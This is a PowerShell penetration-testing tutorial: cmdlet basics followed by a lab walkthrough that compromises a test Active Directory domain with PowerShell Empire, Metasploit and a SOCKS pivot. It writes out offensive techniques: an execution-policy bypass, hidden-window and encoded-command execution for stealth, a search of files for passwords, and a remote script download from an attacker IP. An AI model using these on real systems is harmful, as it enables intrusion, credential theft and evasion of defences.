# Powershell for Penetration Testing

## Powershell Fundamentals

### The Powershell Command Line Interface

We can launch the powershell CLI from a cmd prompt by using `powershell.exe`

Once we are in a powershell session, we can find help for commands using `powershell /?` or `powershell -?` or `powershell -Help`

Another way to get help with powershell is by using the `Get-Help` cmdlet. We just need to specify what it is that we want to get help with: `Get-Help Get-Process`

We can get more help on cmdlets by using the `-Full` parameter: `Get-Help Get-Process -Full`

Another useful feature is `-Examples` which provides us with useful examples of how to use cmdlets: `Get-Help Get-Process -Examples`

>[!TIP]
>We can update our local help files using `Update-Help`

#### Get-Command

This is a very useful cmdlet which lets us list what is available to us in powershell. If we run it without specifying any arguments it will return a list of *all* available commands.

We can filter the results by using the `-Name` parameter which functions in a similar way to `grep` on unix systems. An example is: `Get-Command -Name *Firewall*`

#### Common Powershell Command Line Parameters

Here are some common and useful command line parameters. We can use abbreviations for powershell parameters and their arguments. Furthermore, we can use different casing to that which is shown here since they are not case-sensitive.

##### -ExecutionPolicy

We can specify that the *ExecutionPolicy* be *bypassed* or *unrestricted* when running powershell scripts. The execution policy on powershell is intended to prevent regular users from executing scripts which might cause problems on their system by preventing some scripts from running.

We will want to bypass any execution policies on the system - we can do this using: `powershell.exe -ExecutionPolicy Bypass .\script.ps1` or `powershell.exe -ExecutionPolicy Unrestricted .\script.ps1`

>[!TIP]
>We can abbreviate this parameter to `-ep` or `-ex` and the `Bypass` argument as `by`

##### -WindowStyle

We can hide the powershell window using: `powershell.exe -WindowStyle Hidden .\script.ps1`

This will hide the powershell CLI on the victim machine which will make our work more stealthy.

>[!TIP]
>We can abbreviate this parameter to `-W` or `-Wi` and the `Hidden` argument as `h` or `hi`

##### -Command

This parameter is used to run a command or script block. An example of this is: `powershell.exe -Command Get-Process`

##### -EncodedCommand

This parameter lets us execute commands which have been base64 encoded: `powershell.exe -EncodedCommand $encodedCommand`

>[!TIP]
>We can abbreviate this parameter to `enco` or `ec`

##### -NoProfile

Profiles are scripts which run when the powershell executable is launched. These scripts (profiles) can cause problems when we are trying to execute commands using powershell so it is a good idea to disable them using: `powershell.exe -NoProfile .\script.ps1`

##### -Version

This parameter lets us downgrade to an older version of powershell. This is useful for if we need to use an older version of powershell in order to accomplish what we want: `powershell.exe -Version 2`

>[!NOTE]
>In order for `-Version` to work the specified older version must be installed on the system

### Cmdlets

Cmdlets are powershell scripts which perform single functions - they are similar to functions in other programming languages.

They are *instances* of *.NET framework classes* derived from the *Cmdlet Base Class*.

There are lots of cmdlets we can use but we can also write our own just as we can define our own functions and methods.

#### Syntax

Most cmdlets follow the same naming convention - they use *Verb-Noun* which helps users determine their functionality.

Lots of cmdlets return output to other cmdlets which is processed via a pipe.

Each cmdlet has its own parameters which we can find by using `Get-Help` with the cmdlet name specified.

If we do not use parameters, the cmdlet will return a limited amount of data in columns.

The returned data is important because we can use it to filter the results.

>[!NOTE]
>The output from cmdlets is known as objects

We can pipe the returned objects to other cmdlets.

```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName
```

The above command gets processes and then pipes the returned objects to the `Sort-Object` cmdlet which sorts the objects to make sure only unique ones are returned so there are no duplicates - this is achieved using `-Unique` - the returned objects are then piped to the `Select-Object` cmdlet which selects data based on the parameter `ProcessName` so only the names of the processes is ultimately returned and shown to the user.

We can combine parameters - for example if we want to see the process ids as well as names, we can use:

```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName, Id
```

>[!NOTE]
>We can redirect output using the `>` Redirect Operator

#### Useful Cmdlet Examples

##### Get-Process

This returns a list of all processes.

To get *all* the properties related to the processes we can use:

```powershell
Get-Process | Format-List *
```

We can then have a better idea of how to filter the output and select more data about processes and their parameters which are of interest to us:

```powershell
Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
```

The above command will show us the path property for the chrome and firefox processes.

>[!TIP]
>We can use `fl` as an alias for `Format-List`

##### Get-Alias

If we want to know the aliases for a cmdlet, we can use the `Get-Alias` cmdlet.

```powershell
Get-Alias -Definition Get-ChildItem
```

##### Get-WmiObject

>[!NOTE]
>An alias which is used lots for the `Select-Object` cmdlet is `select`

The example below uses the `Get-WmiObject` cmdlet - this returns data regarding WMI objects - to return data about the OS - this is then piped to `Select-Object` using the `select` alias - the `-Property` parameter is used with the `*` wildcard to return all data relating to the OS.

```powershell
Get-WmiObject -class win32_operatingsystem | select -Property *
```

We can use the `Get-WmiObject` cmdlet to get data about any WMI Class. An example of this is getting data relating to all services with the `win32_service` class.

```powershell
Get-WmiObject -class win32_service | fl *
```

##### Export-Csv

This cmdlet simply exports returned objects to a .csv format.

```powershell
Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\host_info.csv
```

>[!NOTE]
>We can access the Windows Registry hives using `cd HKLM:\`

##### Select-String

This is useful for enumerating systems for specific strings. The example below searches a `Documents` directory for any .txt files which contain the string `pass` in them.

```powershell
Select-String -Path C:\Users\Dduck\Documents\*.txt -Pattern pass*
```

##### Get-Service

This cmdlet returns services - we can filter the returned objects in different ways. The example below searches for services which begin with *S* and then sorts them based on their status in descending order.

```powershell
Get-Service "s" | Sort-Object Status -Descending
```

### Powershell Objects

Powershell is an *Object Oriented* based scripting language and as such utilises *classes* and *objects* which are instantiated from them.

#### Finding Methods for Objects

As mentioned earler, powershell returns *objects* as the data returned from the execution of cmdlets. This means that the data returned posesses *methods* as well as *properties*

We have seen how we can list all the properties of objects using: `Get-Process firefox | Sort-Object -Unique | Format-List *` This command will show us all the properties of the object which has been returned by the `Get-Process` cmdlet along with their corresponding values.

In order to find the *methods* which are associated with objects returned from specified cmdlets we can use:

```powershell
Get-Process | Get-Member -MemberType Method
```

Once we know the methods which are attached to the objects we can call them if we want to. An example would be first of all checking which methods can be called on objects which are returned from the `Get-Process` cmdlet: `Get-Process | Get-Member -MemberType Method` and then deciding to use the `Kill` method on one of the returned objects - in this case `firefox`. We can call the method as follows:

```powershell
Get-Process -Name firefox | Kill
```

#### Creating .NET Objects

We can instantiate our own objects from .NET classes and then use their associated methods to achieve our goals.

An example of this is using the `WebClient` class from the `System.Net` namespace to instantiate an object which can then be used to perform common tasks relating to the transfer of data to and from resources using a URI such as downloading data to a local file.

In order to instnatiate new objects from .NET classes we can use the `New-Object` cmdlet.

```powershell
$webClient = New-Object System.Net.WebClient
$remoteUrl = "http://192.168.56.108/script.ps1"
$file = "C:\Temp\script.ps1"
$webClient.DownloadFile($remoteUrl, $file)
```

This could also be achieved using: `(New-Object Net.WebClient).DownloadFile("http://192.168.56.108/script.ps1", "C:\Temp\script.ps1")`

## PowerShell Empire

Powershell Empire is an opensource Command and Control server. It can be installed on a kali system using the apt package manager. There is also a GUI for it called *starkiller* though I do not use it in this tutorial.

For the rest of this section, I will be illustrating how we can use empire to assist in our enumeration of target machines by attacking an active directory domain I created for testing purposes. Our goal here is to pwn the domain controller using empire and any other tools as needed.

### Server and Client

We first of all need to start the empire server and then we can start the empire client.

![pse1](/images/ps_empire/1.png)

![pse2](/images/ps_empire/2.png)

### Listener

We need to create a listener in empire. These serve the same purpose as netcat listeners and handlers in msfconsole - they listen for connections.

![pse3](/images/ps_empire/3.png)

![pse4](/images/ps_empire/4.png)

![pse5](/images/ps_empire/5.png)

### Stager

A stager is created - we will use this like a payload in msfconsole. There are different types of stager available - we will be using *multi_launcher* and keeping the language as *powershell*

There are lots of ways to get malicious code or scripts to run on a target machine - in this example I have already compromised an initial machine using SMB so I am able to copy and paste from one terminal to another.

`usestager multi_launcher`

![pse7](/images/ps_empire/7.png)

>[!NOTE]
>In this example I turned off antivirus - a default stager will be flagged by av solutions - obfuscation of the code is possible and covered later in this tutorial

### Agent

The agent is very important since it will be executing the commands and modules we specify. Once the listener receives a connection back from the stager we find a new agent checks into our empire session.

![pse8](/images/ps_empire/8.png)

We can now *interact* with the agent.

![pse9](/images/ps_empire/9.png)

### Modules

The modules make empire very useful. They are packages of tools which we can use from within our empire session. We can find lots of popular tools such as PowerView scripts and SessionGopher.

>[!NOTE]
>Once we have established an *agent* on a victim machine, we do not need to worry about av picking up the commands and modules we are running

#### Arpscan

In this example, we use an arpscan module to look for other hosts on the internal network we have initially compromised.

By doing this, we find a new host at IP address 192.168.56.109

![pse10](/images/ps_empire/10.png)

![pse11](/images/ps_empire/11.png)

#### Port Scanning

We can now port scan the newly found host using a port scanner tool in our empire session.

![pse12](/images/ps_empire/12.png)

![pse13](/images/ps_empire/13.png)

#### Enumeration

We can use PowerView scripts as empire modules to enumerate the victim machine and domain. The following images illustrate some of the enumeration we can perform.

![pse14](/images/ps_empire/14.png)

![pse15](/images/ps_empire/15.png)

![pse16](/images/ps_empire/16.png)

![pse17](/images/ps_empire/17.png)

![pse18](/images/ps_empire/18.png)

![pse19](/images/ps_empire/19.png)

![pse20](/images/ps_empire/20.png)

![pse21](/images/ps_empire/21.png)

##### SessionGopher

We can also run SessionGopher from our empire session - no credentials were found in this example but this is not surprising as I have not used the targeted services on this example domain.

![pse22](/images/ps_empire/22.png)

### Interaction with MSF

We can attempt to gain a meterpreter session from our empire session by combining modules from both frameworks.

In this example, we first of all set up a `web_delivery` module in `msfconsole`

![pse23](/images/ps_empire/23.png)

![pse24](/images/ps_empire/24.png)

We then use the `invoke_metasploitpayload` module in our empire session.

![pse25](/images/ps_empire/25.png)

We are able to get a meterpreter session.

![pse26](/images/ps_empire/26.png)

>[!NOTE]
>We have now finished using empire for this tutorial - it seems odd not to finish this attack chain though so I will carry it on

### Establish a Pivot

In our meterpreter session we can set up a route to the internal network via the compromised machine.

![pse27](/images/ps_empire/27.png)

### Start a SOCKS Proxy

We then start a SOCKS proxy so we can use tools on our attacking machine against the domain controller via the pivot machine using `proxychains`

![pse28](/images/ps_empire/28.png)

![pse29](/images/ps_empire/29.png)

### Pwning the Domain Controller

We can now use tools via the pivot using `proxychains`

In this example, I use nmap to check it is all working and we have a connection to the domain controller before using the looted creds of the *SQLService* user to pwn the d.c.

![pse30](/images/ps_empire/30.png)

![pse31](/images/ps_empire/31.png)

